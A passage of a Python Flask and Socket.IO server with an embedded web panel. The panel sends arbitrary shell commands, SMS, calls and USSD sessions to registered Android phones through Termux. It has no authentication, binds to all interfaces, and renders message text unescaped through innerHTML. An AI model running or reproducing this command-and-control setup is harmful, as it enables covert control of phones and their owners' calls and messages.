            } else {
                selectPhone('');
            }
        }
        
        function selectPhone(phoneId) {
            selectedPhone = phoneId;
            document.getElementById('phoneSelect').value = phoneId;
            document.getElementById('selectedDeviceInfo').textContent = phoneId ? `Selected: ${phoneId}` : 'No device selected';
            document.getElementById('selectedDeviceInfo').style.color = phoneId ? 'var(--neon-blue)' : 'var(--text-secondary)';
            updatePhoneDisplay();
        }
        
        function addToLiveFeed(text) {
            const feed = document.getElementById('liveFeed');
            const lines = text.split('\\n');
            lines.forEach(line => {
                if (line.trim()) {
                    const div = document.createElement('div');
                    div.textContent = line;
                    feed.appendChild(div);
                }
            });
            feed.scrollTop = feed.scrollHeight;
        }
        
        function addMessageToPanel(phoneId, message, timestamp) {
            const messagesPanel = document.getElementById('messagesPanel');
            
            // Remove empty state if it exists
            if (messagesPanel.querySelector('.empty-state')) {
                messagesPanel.innerHTML = '';
            }
            
            const time = new Date(timestamp).toLocaleTimeString();
            const messageDiv = document.createElement('div');
            messageDiv.className = 'message';
            messageDiv.innerHTML = `
                <div class="message-time">
                    <i class="fas fa-mobile-alt"></i>
                    ${phoneId} • ${time}
                </div>
                <div class="message-content">${message}</div>
            `;
            messagesPanel.insertBefore(messageDiv, messagesPanel.firstChild);
        }
        
        function addNumber(num) {
            const display = document.getElementById('phoneNumber');
            display.textContent += num;
        }
        
        function clearNumber() {
            document.getElementById('phoneNumber').textContent = '';
        }
        
        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : 'exclamation-circle'}"></i> ${message}`;
            notification.className = `notification ${type} show`;
            setTimeout(() => notification.classList.remove('show'), 4000);
        }
        
        function updateConnectionStatus(connected) {
            const status = document.getElementById('connectionStatus');
            if (connected) {
                status.className = 'connection-status connected';
                status.innerHTML = '<i class="fas fa-wifi"></i> CONNECTED TO SERVER';
            } else {
                status.className = 'connection-status disconnected';
                status.innerHTML = '<i class="fas fa-wifi-slash"></i> DISCONNECTED';
            }
        }
        
        // USSD Functions
        function startUSSD() {
            const ussdCode = document.getElementById('phoneNumber').textContent;
            if (!selectedPhone || !ussdCode) {
                showNotification('Select device and enter USSD code!', 'danger');
                return;
            }
            
            socket.emit('start_ussd', {
                phone_id: selectedPhone,
                ussd_code: ussdCode
            });
            
            clearNumber();
        }
        
        function loadUSSDCode(code) {
            document.getElementById('phoneNumber').textContent = code;
        }
        
        function showUSSDInterface(data) {
            const container = document.getElementById('ussdSessionContainer');
            container.innerHTML = `
                <div class="ussd-session" id="ussdSession-${data.session_id}">
                    <div class="ussd-header">
                        <div class="ussd-title">
                            <i class="fas fa-broadcast-tower"></i>
                            LIVE USSD SESSION - ${data.phone_id}
                        </div>
                        <button class="ussd-close" onclick="endUSSD('${data.session_id}')">
                            <i class="fas fa-times"></i> END
                        </button>
                    </div>
                    <div class="ussd-status">
                        <div class="status-dot"></div>
                        <span>Connected to mobile network - Session active</span>
                    </div>
                    <div class="ussd-display" id="ussdDisplay-${data.session_id}">
${data.response}
                    </div>
                    <div class="ussd-input-group">
                        <input type="text" class="ussd-input" id="ussdInput-${data.session_id}" placeholder="Enter your selection...">
                        <button class="ussd-send" onclick="sendUSSDResponse('${data.session_id}')">
                            <i class="fas fa-paper-plane"></i> SEND
                        </button>
                    </div>
                    <div class="ussd-quick-options" id="ussdOptions-${data.session_id}">
                        <!-- Quick options will be generated here -->
                    </div>
                </div>
            `;
            
            generateQuickOptions(data.session_id, data.response);
            addToUSSDHistory(data.phone_id, `Started USSD: ${data.ussd_code}`, data.response);
        }
        
        function updateUSSDDisplay(data) {
            const display = document.getElementById(`ussdDisplay-${data.session_id}`);
            if (display) {
                display.textContent = data.response;
                generateQuickOptions(data.session_id, data.response);
                
                if (data.response.includes('Thank you') || data.response.includes('success') || 
                    data.response.includes('Invalid') || data.response.includes('failed')) {
                    setTimeout(() => endUSSD(data.session_id), 3000);
                }
            }
        }
        
        function endUSSDInterface(data) {
            const sessionElement = document.getElementById(`ussdSession-${data.session_id}`);
            if (sessionElement) {
                sessionElement.remove();
            }
            
            if (data.response) {
                addToUSSDHistory(data.phone_id, 'USSD Session Ended', data.response);
            }
            
            activeUSSD = null;
        }
        
        function endUSSD(sessionId) {
            socket.emit('end_ussd', { session_id: sessionId });
        }
        
        function sendUSSDResponse(sessionId) {
            const input = document.getElementById(`ussdInput-${sessionId}`);
            const response = input.value.trim();
            
            if (response) {
                socket.emit('ussd_response', {
                    session_id: sessionId,
                    response: response
                });
                input.value = '';
            }
        }
        
        function generateQuickOptions(sessionId, response) {
            const optionsContainer = document.getElementById(`ussdOptions-${sessionId}`);
            if (!optionsContainer) return;
            
            // Extract numbers from response for quick selection
            const numberMatches = response.match(/\d\./g);
            if (numberMatches) {
                const options = numberMatches.map(match => match.replace('.', ''));
                optionsContainer.innerHTML = options.map(opt => `
                    <div class="ussd-option" onclick="document.getElementById('ussdInput-${sessionId}').value='${opt}'; sendUSSDResponse('${sessionId}')">
                        ${opt}
                    </div>
                `).join('');
            } else {
                optionsContainer.innerHTML = '';
            }
        }
        
        function addToUSSDHistory(phoneId, action, response) {
            const historyPanel = document.getElementById('ussdHistoryPanel');
            
            // Remove empty state if it exists
            if (historyPanel.querySelector('.empty-state')) {
                historyPanel.innerHTML = '';
            }
            
            const time = new Date().toLocaleTimeString();
            const messageDiv = document.createElement('div');
            messageDiv.className = 'message';
            messageDiv.innerHTML = `
                <div class="message-time">
                    <i class="fas fa-broadcast-tower"></i>
                    ${phoneId} • ${time} • ${action}
                </div>
                <div class="message-content" style="font-family: 'Courier New', monospace; white-space: pre-wrap;">${response}</div>
            `;
            historyPanel.insertBefore(messageDiv, historyPanel.firstChild);
        }
        
        async function sendCommand(command) {
            if (!selectedPhone) return showNotification('Please select a device first!', 'danger');
            
            try {
                const response = await fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: selectedPhone, command})
                });
                
                const result = await response.json();
                if (result.status === 'success') {
                    commandCount++;
                    document.getElementById('totalCommands').textContent = commandCount;
                    showNotification('Command sent successfully!');
                    addToLiveFeed(`> ${selectedPhone}: ${command}`);
                } else {
                    showNotification('Device not found!', 'danger');
                }
            } catch (error) {
                showNotification('Error sending command', 'danger');
            }
        }
        
        async function dialNumber() {
            const number = document.getElementById('phoneNumber').textContent;
            if (!selectedPhone || !number) return showNotification('Select device and enter number!', 'danger');
            await sendCommand(`termux-telephony-call "${number}"`);
        }
        
        async function sendSMS() {
            const number = document.getElementById('smsNumber').value;
            const message = document.getElementById('smsMessage').value;
            if (!selectedPhone || !number || !message) return showNotification('Fill all SMS fields!', 'danger');
            await sendCommand(`termux-sms-send -n "${number}" "${message}"`);
            showNotification('SMS sent!');
        }
        
        async function sendCustomCommand() {
            const command = document.getElementById('customCommand').value;
            if (!selectedPhone || !command) return showNotification('Select device and enter command!', 'danger');
            await sendCommand(command);
        }
        
        // Event listeners
        document.getElementById('phoneSelect').addEventListener('change', function() {
            selectPhone(this.value);
        });
        
        // Enter key for USSD
        document.addEventListener('keypress', function(event) {
            if (event.key === 'Enter' && activeUSSD) {
                const input = document.getElementById(`ussdInput-${activeUSSD}`);
                if (input && document.activeElement === input) {
                    sendUSSDResponse(activeUSSD);
                }
            }
        });
        
        // Auto-update
        setInterval(() => {
            fetch('/api/phones')
                .then(response => response.json())
                .then(phoneList => {
                    phones = phoneList;
                    updatePhoneDisplay();
                });
        }, 2000);
        
        // Initialize
        updatePhoneDisplay();
    </script>
</body>
</html>
"""

@app.route('/')
def control_panel():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/phones')
def get_phones():
    with phone_lock:
        return jsonify(list(connected_phones.keys()))

@app.route('/api/command', methods=['POST'])
def send_command():
    data = request.json
    phone_id = data.get('phone')
    command = data.get('command')
    
    with phone_lock:
        if phone_id in connected_phones:
            if phone_id not in phone_messages:
                phone_messages[phone_id] = []
            
            message_data = {
                'type': 'command',
                'content': command,
                'timestamp': datetime.now().isoformat(),
                'direction': 'outgoing'
            }
            phone_messages[phone_id].append(message_data)
            
            socketio.emit('command', {
                'action': 'shell', 
                'command': command,
                'message_id': len(phone_messages[phone_id])
            }, room=connected_phones[phone_id]['sid'])
            
            socketio.emit('new_message', {
                'phone_id': phone_id,
                'message': f"Command: {command}",
                'timestamp': datetime.now().isoformat()
            })
            
            return jsonify({'status': 'success'})
    
    return jsonify({'status': 'phone not found'})

# USSD Session Management
@socketio.on('start_ussd')
def handle_start_ussd(data):
    phone_id = data.get('phone_id')
    ussd_code = data.get('ussd_code')
    
    with phone_lock:
        if phone_id in connected_phones:
            session_id = f"ussd_{phone_id}_{int(time.time())}"
            ussd_sessions[session_id] = {
                'phone_id': phone_id,
                'ussd_code': ussd_code,
                'started_at': datetime.now(),
                'sid': connected_phones[phone_id]['sid'],
                'active': True
            }
            
            socketio.emit('command', {
                'action': 'ussd',
                'command': f'start_ussd:{ussd_code}',
                'session_id': session_id
            }, room=connected_phones[phone_id]['sid'])
            
            socketio.emit('ussd_session_start', {
                'session_id': session_id,
                'phone_id': phone_id,
                'ussd_code': ussd_code,
                'response': 'Connecting to mobile network...',
                'timestamp': datetime.now().isoformat()
            })

@socketio.on('ussd_response')
def handle_ussd_response(data):
    session_id = data.get('session_id')
    response = data.get('response')
    
    if session_id in ussd_sessions:
        session = ussd_sessions[session_id]
        socketio.emit('command', {
            'action': 'ussd',
            'command': f'ussd_response:{response}',
            'session_id': session_id
        }, room=session['sid'])

@socketio.on('end_ussd')
def handle_end_ussd(data):
    session_id = data.get('session_id')
    if session_id in ussd_sessions:
        session = ussd_sessions[session_id]
        socketio.emit('command', {
            'action': 'ussd',
            'command': 'end_ussd',
            'session_id': session_id
        }, room=session['sid'])
        
        del ussd_sessions[session_id]
        socketio.emit('ussd_session_end', {
            'session_id': session_id,
            'phone_id': session['phone_id'],
            'response': 'Session ended by user',
            'timestamp': datetime.now().isoformat()
        })

@socketio.on('ussd_update')
def handle_ussd_update(data):
    session_id = data.get('session_id')
    response = data.get('response')
    
    if session_id in ussd_sessions:
        socketio.emit('ussd_update', {
            'session_id': session_id,
            'response': response,
            'timestamp': datetime.now().isoformat()
        })

@socketio.on('connect')
def handle_connect():
    print(f"🔗 New connection: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    with phone_lock:
        phones_to_remove = []
        for phone_id, phone_data in connected_phones.items():
            if phone_data['sid'] == request.sid:
                phones_to_remove.append(phone_id)
        
        for phone_id in phones_to_remove:
            del connected_phones[phone_id]
            print(f"❌ {phone_id} - DISCONNECTED (Total: {len(connected_phones)})")
    
    socketio.emit('phone_list_update', list(connected_phones.keys()))

@socketio.on('register')
def handle_register(data):
    phone_id = data.get('device_id')
    with phone_lock:
        connected_phones[phone_id] = {
            'sid': request.sid,
            'connected_at': datetime.now(),
            'last_seen': datetime.now()
        }
        print(f"✅ {phone_id} - CONNECTED (Total: {len(connected_phones)})")
    
    socketio.emit('phone_list_update', list(connected_phones.keys()))
    socketio.emit('new_message', {
        'phone_id': phone_id,
        'message': "Device connected successfully",
        'timestamp': datetime.now().isoformat()
    })

@socketio.on('message_response')
def handle_message_response(data):
    phone_id = data.get('phone_id')
    message = data.get('message')
    message_type = data.get('type', 'info')
    
    if phone_id not in phone_messages:
        phone_messages[phone_id] = []
    
    phone_messages[phone_id].append({
        'type': message_type,
        'content': message,
        'timestamp': datetime.now().isoformat(),
        'direction': 'incoming'
    })
    
    socketio.emit('new_message', {
        'phone_id': phone_id,
        'message': f"{message_type.upper()}: {message}",
        'timestamp': datetime.now().isoformat()
    })
    
    socketio.emit('command_response', {
        'phone_id': phone_id,
        'response': message
    })

if __name__ == '__main__':
    print("🚀 Starting Neon Control Server...")
    print("📍 Web Panel: http://localhost:5000")
    print("🎮 Modern Dark UI Activated")
    print("📡 USSD System Ready")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
